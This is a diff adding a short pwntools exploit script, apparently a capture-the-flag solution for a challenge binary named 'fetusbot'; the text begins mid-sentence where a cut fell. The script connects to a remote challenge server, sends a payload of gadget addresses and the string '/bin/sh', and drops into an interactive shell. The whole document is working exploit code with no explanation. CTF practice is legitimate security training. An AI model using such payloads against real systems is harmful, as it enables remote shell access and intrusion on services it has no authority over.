@@ -1,0 +1,24 @@
+ou can do it in one go, this was my script
+from pwn import *
+
+# context.binary = elf = ELF('./fetusbot')
+# context.log_level = "DEBUG"
+context.arch = "amd64"
+
+# p = elf.process()
+p = remote("0.cloud.chals.io", 26925)
+
+payload = flat(
+    0x13370B8,
+    0x133705A,
+    0x1337081,
+    b"/bin/sh\x00",
+    0x133700D
+).ljust(58, b"\x00")
+
+print(f"{payload=}")
+print(f"{len(payload)=}")
+
+p.sendline(payload)
+p.interactive()
+p.close()
